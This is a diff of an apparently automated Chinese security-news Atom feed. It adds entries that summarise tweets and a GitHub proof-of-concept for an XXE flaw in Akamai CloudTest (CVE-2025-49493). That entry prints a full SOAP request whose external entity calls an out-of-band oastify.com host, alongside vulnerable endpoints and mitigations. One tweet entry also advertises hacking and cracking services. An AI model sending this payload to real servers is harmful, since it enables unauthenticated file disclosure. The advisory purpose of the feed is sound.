@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-05T13:15:59.341Z</updated>
+  <updated>2025-07-05T14:00:29.807Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,108 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>HypnInfoSec Twitter Update !</title>
+    <link href="http://example.com/2025/07/05/twitter_2198364211/"/>
+    <id>http://example.com/2025/07/05/twitter_2198364211/</id>
+    <published>2025-07-05T14:00:29.000Z</published>
+    <updated>2025-07-05T14:00:29.807Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> HypnInfoSec</p><p><strong>推文：</strong> 哈哈 CVE-2025-20309</p><p><strong>链接：</strong> <a href="https://x.com/HypnInfoSec/status/1941494225620852896">https://x.com/HypnInfoSec/status/1941494225620852896</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; HypnInfoSec&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 哈哈 CVE-2025-20309&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://x.com/HypnInf</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="HypnInfoSec" scheme="http://example.com/tags/HypnInfoSec/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Akamai CloudTest XXE Injection Vulnerability</title>
+    <link href="http://example.com/2025/07/05/github_1717591136/"/>
+    <id>http://example.com/2025/07/05/github_1717591136/</id>
+    <published>2025-07-05T14:00:26.000Z</published>
+    <updated>2025-07-05T14:00:26.423Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Akamai CloudTest XXE Injection Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49493</li></ul><p><strong>漏洞类型：</strong> XML实体注入</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> Akamai CloudTest是一款广泛使用的云测试平台，主要用于企业级服务的性能测试和安全评估。该平台通过模拟大量用户请求来测试Web应用和服务的稳定性和安全性，因此在企业和服务提供商中非常受欢迎。此次发现的XXE注入漏洞影响了版本60（构建12988）之前的所有Akamai CloudTest实例。</p><p>该漏洞属于XML外部实体注入（XXE）类型，其技术根源在于Akamai CloudTest在处理SOAP请求时，未能正确限制XML解析器对外部实体的处理。攻击者可以通过构造恶意的XML请求，利用SOAP端点（如&#x2F;concerto&#x2F;services&#x2F;RepositoryService等）注入外部DTD，进而读取服务器上的本地文件内容。这种攻击不需要任何形式的认证或用户交互，使得风险大大增加。</p><p>从影响分析来看，此漏洞可能导致严重的安全风险，包括但不限于敏感信息泄露（如读取&#x2F;etc&#x2F;passwd文件）、服务器配置暴露等。由于攻击者可以远程利用此漏洞，且无需认证，因此该漏洞的潜在危害范围广泛，尤其是在未及时打补丁的环境中。此外，攻击者还可能利用此漏洞进行进一步的网络渗透，如利用泄露的信息进行更有针对性的攻击。因此，建议所有使用Akamai CloudTest的企业和服务提供商立即升级到版本60或更高版本，以防范潜在的安全威胁。</p><p><strong>产品厂商：</strong> Akamai</p><p><strong>产品名称：</strong> Akamai CloudTest</p><p><strong>影响版本：</strong> version &lt; 60 (build 12988)</p><p><strong>来源：</strong> <a href="https://github.com/B1ack4sh/Blackash-CVE-2025-49493">https://github.com/B1ack4sh/Blackash-CVE-2025-49493</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-49493-Akamai-CloudTest-XXE-Injection"><a href="#CVE-2025-49493-Akamai-CloudTest-XXE-Injection" class="headerlink" title="CVE-2025-49493 Akamai CloudTest - XXE Injection"></a>CVE-2025-49493 Akamai CloudTest - XXE Injection</h2><h3 id="📄-Description"><a href="#📄-Description" class="headerlink" title="📄 Description:"></a>📄 Description:</h3><p>Akamai CloudTest before 60 2025.06.02 (12988) allows file inclusion via XML External Entity (XXE) injection.</p><hr><h3 id="🛠️-Basic-Information"><a href="#🛠️-Basic-Information" class="headerlink" title="🛠️ Basic Information:"></a>🛠️ Basic Information:</h3><ul><li><strong>Affected Product</strong>: Akamai CloudTest (prior to version 60 — build 12988, released June 2025)</li><li><strong>Vulnerability Type</strong>: XML External Entity Injection (XXE)</li><li><strong>CWE</strong>: CWE‑611 – Improper Restriction of XML External Entity</li><li><strong>Impact</strong>: Remote attackers can send crafted XML to read local files on the server without authentication or user interaction.</li></ul><hr><h3 id="🔍-Technical-Details"><a href="#🔍-Technical-Details" class="headerlink" title="🔍 Technical Details:"></a>🔍 Technical Details:</h3><ul><li>Vulnerable SOAP endpoints include:</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/concerto/</span>services/RepositoryService<br><span class="hljs-regexp">/concerto/</span>services/CollectorService<br><span class="hljs-regexp">/concerto/</span>services/Concerto<br><span class="hljs-regexp">/concerto/</span>services/SampleService<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">//concerto/services/RepositoryService</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>readacted.com<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Sec-Ch-Ua</span><span class="hljs-punctuation">: </span>&quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;, &quot;Brave&quot;;v=&quot;138&quot;<br><span class="hljs-attribute">Sec-Ch-Ua-Mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">Sec-Ch-Ua-Platform</span><span class="hljs-punctuation">: </span>&quot;macOS&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (******; **** *** ** X 10_15_7) **********/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 *****/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8<br><span class="hljs-attribute">Sec-Gpc</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>610<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">soapenv</span>:Envelope [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://b6it5hei11vmt9as2lbg98h4gvmrahy6.oastify.com&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">                  <span class="hljs-attr">xmlns:rep</span>=<span class="hljs-string">&quot;http://example.com/services/repository&quot;</span>&gt;</span></span><br><span class="language-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>/&gt;</span></span><br><span class="language-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">rep:getUIBundleObjectXml</span>&gt;</span></span><br><span class="language-xml">         <span class="hljs-tag">&lt;<span class="hljs-name">rep:uiBundleRequestXml</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">rep:uiBundleRequestXml</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">rep:getUIBundleObjectXml</span>&gt;</span></span><br><span class="language-xml">   <span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span></span><br></code></pre></td></tr></table></figure><ul><li>The flaw allows attackers to inject external DTDs (Document Type Definitions) and exploit XML parsers to leak local file content.</li><li>Techniques such as error-based parsing and out-of-band (OOB) data exfiltration can be used.</li></ul><hr><h3 id="📊-Severity"><a href="#📊-Severity" class="headerlink" title="📊 Severity:"></a>📊 Severity:</h3><ul><li><strong>CVSS v3.1 Score</strong>: 5.8 (Medium 🟠)</li><li><strong>Attack Vector</strong>: Network</li><li><strong>Privileges Required</strong>: None</li><li><strong>User Interaction</strong>: None</li><li><strong>Impact</strong>: Confidentiality breach (e.g., reading <code>/etc/passwd</code>)</li></ul><hr><h3 id="✅-Mitigation-Steps"><a href="#✅-Mitigation-Steps" class="headerlink" title="✅ Mitigation Steps:"></a>✅ Mitigation Steps:</h3><ol><li><strong>Update to CloudTest version 60 or later</strong>, where external entity parsing is disabled by default.</li><li><strong>Disable DTD processing</strong> in XML parsers manually if an upgrade isn’t possible.</li><li><strong>Restrict network access</strong> to CloudTest instances (e.g., via firewalls and IP allowlists).</li><li><strong>Monitor XML traffic</strong> for anomalies or known exploit patterns.</li><li><strong>Limit file access permissions</strong> for the CloudTest service to reduce impact.</li><li><strong>Deploy a WAF (Web Application Firewall)</strong> with rules against XXE attacks.</li></ol><hr><h3 id="📅-Timeline"><a href="#📅-Timeline" class="headerlink" title="📅 Timeline:"></a>📅 Timeline:</h3><ul><li>Vulnerability discovered: June 2025</li><li>Fix released: Early July 2025</li><li>Proof of Concept (PoC) exists publicly.</li><li>No confirmed mass exploitation as of now.</li></ul><hr><h4 id="✅-Summary-Table"><a href="#✅-Summary-Table" class="headerlink" title="✅ Summary Table:"></a>✅ Summary Table:</h4><table><thead><tr><th>Field</th><th>Details</th></tr></thead><tbody><tr><td>Product</td><td>Akamai CloudTest &lt; v60</td></tr><tr><td>CVSS Score</td><td>5.8 (Medium)</td></tr><tr><td>Exploitable</td><td>Remotely, no auth required</td></tr><tr><td>Affected Feature</td><td>XML SOAP services</td></tr><tr><td>Attack Technique</td><td>XXE via external DTDs</td></tr><tr><td>Patch</td><td>Available in version 60 (June 2025)</td></tr><tr><td>Risk</td><td>Disclosure of sensitive files</td></tr></tbody></table><hr><h3 id="⚠️-Disclaimer"><a href="#⚠️-Disclaimer" class="headerlink" title="⚠️ Disclaimer:"></a>⚠️ Disclaimer:</h3><p>This PoC is provided for educational and research purposes only. Running this on any system without permission is illegal and unethical !!!</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Akamai CloudTest XXE Injection Vulnerab</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="XML实体注入" scheme="http://example.com/tags/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Bavenhack Twitter Update !</title>
+    <link href="http://example.com/2025/07/05/twitter_3394795140/"/>
+    <id>http://example.com/2025/07/05/twitter_3394795140/</id>
+    <published>2025-07-05T14:00:25.000Z</published>
+    <updated>2025-07-05T14:00:25.439Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> Bavenhack</p><p><strong>推文：</strong> 🚨#黑客 #Snap破解📢📢📢 #购买内容 #Monkey应用 #Telegram链接 #Snapchat泄露 #加密货币 #比特币฿ #轻松赚钱 #购买Snap破解 旧相机，新威胁 🔥<br>Edimax IC-7100相机中存在一个严重漏洞（CVE-2025-1316，CVSS 9.3），正遭受主动攻击——未打补丁的设备危在旦夕‼ <a href="https://t.co/Bu36sOrP5Q">https://t.co/Bu36sOrP5Q</a></p><p><strong>链接：</strong> <a href="https://x.com/Bavenhack/status/1941495091677495432">https://x.com/Bavenhack/status/1941495091677495432</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; Bavenhack&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨#黑客 #Snap破解📢📢📢 #购买内容 #Monkey应用 #Telegram链接 #Snapchat泄露 #加密货币 #比特币฿ #轻松赚钱 </summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="Bavenhack" scheme="http://example.com/tags/Bavenhack/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Cezar_H_Linux Twitter Update !</title>
+    <link href="http://example.com/2025/07/05/twitter_1305463099/"/>
+    <id>http://example.com/2025/07/05/twitter_1305463099/</id>
+    <published>2025-07-05T14:00:16.000Z</published>
+    <updated>2025-07-05T14:00:16.199Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> Cezar_H_Linux</p><p><strong>推文：</strong> 🚨 #SUSE Linux Micro 6.0 用户注意：针对CVE-2025-30258（拒绝服务漏洞）的关键GPG2补丁现已发布。<br>🔧 修复方法：zypper in -t patch SUSE-SLE-Micro-6.0-370&#x3D;1<br>📌 CVSS评分：2.7 | 本地利用<br>🔗 了解更多：👉<a href="https://t.co/zPLgVUJzNn">https://t.co/zPLgVUJzNn</a>          #Linux #信息安全 <a href="https://t.co/12u1WFaQdX">https://t.co/12u1WFaQdX</a></p><p><strong>链接：</strong> <a href="https://x.com/Cezar_H_Linux/status/1941496158674878615">https://x.com/Cezar_H_Linux/status/1941496158674878615</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; Cezar_H_Linux&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 #SUSE Linux Micro 6.0 用户注意：针对CVE-2025-30258（拒绝服务漏洞）的关键GPG2补丁现已发布。&lt;br&gt;🔧</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="Cezar_H_Linux" scheme="http://example.com/tags/Cezar-H-Linux/"/>
+    
+  </entry>
   
   <entry>
     <title>aiohttp Directory Traversal Vulnerability</title>
@@ -418,109 +520,6 @@
     <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; dailycve&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🔴 Nextjs，缓存污染，#CVE-2025-49005（严重）&lt;/p&gt;
 &lt;p&gt;&lt;a href=&quot;https://t.co/EkOpZ5LGbY&quot;&gt;htt</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="dailycve" scheme="http://example.com/tags/dailycve/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>dailycve Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_1629384040/"/>
-    <id>http://example.com/2025/07/05/twitter_1629384040/</id>
-    <published>2025-07-05T12:01:20.000Z</published>
-    <updated>2025-07-05T12:01:20.247Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> dailycve</p><p><strong>推文：</strong> 🔴 MCP #Python SDK，因未处理的异常导致的拒绝服务，#CVE-2025-XXXXX（高危）</p><p><a href="https://t.co/q7gei3I9gD">https://t.co/q7gei3I9gD</a></p><p><strong>链接：</strong> <a href="https://x.com/dailycve/status/1941454926124810536">https://x.com/dailycve/status/1941454926124810536</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; dailycve&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🔴 MCP #Python SDK，因未处理的异常导致的拒绝服务，#CVE-2025-XXXXX（高危）&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://t</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="dailycve" scheme="http://example.com/tags/dailycve/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>threatsbank Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_1176222164/"/>
-    <id>http://example.com/2025/07/05/twitter_1176222164/</id>
-    <published>2025-07-05T12:01:15.000Z</published>
-    <updated>2025-07-05T12:01:15.419Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> threatsbank</p><p><strong>推文：</strong> 🛡️ Apache Tomcat (CVE-2025-24813) 和 Camel (CVE-2025-27636&#x2F;29891) 中的远程代码执行漏洞正遭受活跃攻击。</p><p>🚨 攻击者利用部分PUT请求和头部大小写技巧进行利用。</p><p>🔧 立即修补。已检测到超过12.5万次尝试。</p><p>了解更多：<a href="https://t.co/tO1iixhgQb">https://t.co/tO1iixhgQb</a><br>#Apache #CVE2025 #网络安全</p><p><strong>链接：</strong> <a href="https://x.com/threatsbank/status/1941455898720993718">https://x.com/threatsbank/status/1941455898720993718</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; threatsbank&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🛡️ Apache Tomcat (CVE-2025-24813) 和 Camel (CVE-2025-27636&amp;#x2F;29891) 中的远程代</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="threatsbank" scheme="http://example.com/tags/threatsbank/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>dailycve Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_1943141070/"/>
-    <id>http://example.com/2025/07/05/twitter_1943141070/</id>
-    <published>2025-07-05T12:01:07.000Z</published>
-    <updated>2025-07-05T12:01:07.303Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> dailycve</p><p><strong>推文：</strong> 🔴 MCP #Python SDK，验证错误导致拒绝服务，#CVE-2025-XXXXX（高严重性）</p><p><a href="https://t.co/akliEjkCuj">https://t.co/akliEjkCuj</a></p><p><strong>链接：</strong> <a href="https://x.com/dailycve/status/1941455967851511842">https://x.com/dailycve/status/1941455967851511842</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; dailycve&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🔴 MCP #Python SDK，验证错误导致拒绝服务，#CVE-2025-XXXXX（高严重性）&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://t.c</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="dailycve" scheme="http://example.com/tags/dailycve/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>dailycve Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_760045599/"/>
-    <id>http://example.com/2025/07/05/twitter_760045599/</id>
-    <published>2025-07-05T12:01:01.000Z</published>
-    <updated>2025-07-05T12:01:01.563Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> dailycve</p><p><strong>推文：</strong> 🔴 NextJS，通过缓存投毒导致的拒绝服务(DoS)，#CVE-2025-49826（高严重性）</p><p><a href="https://t.co/9kagwFwssk">https://t.co/9kagwFwssk</a></p><p><strong>链接：</strong> <a href="https://x.com/dailycve/status/1941456176388112446">https://x.com/dailycve/status/1941456176388112446</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; dailycve&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🔴 NextJS，通过缓存投毒导致的拒绝服务(DoS)，#CVE-2025-49826（高严重性）&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://t.co</summary>
       
     
     
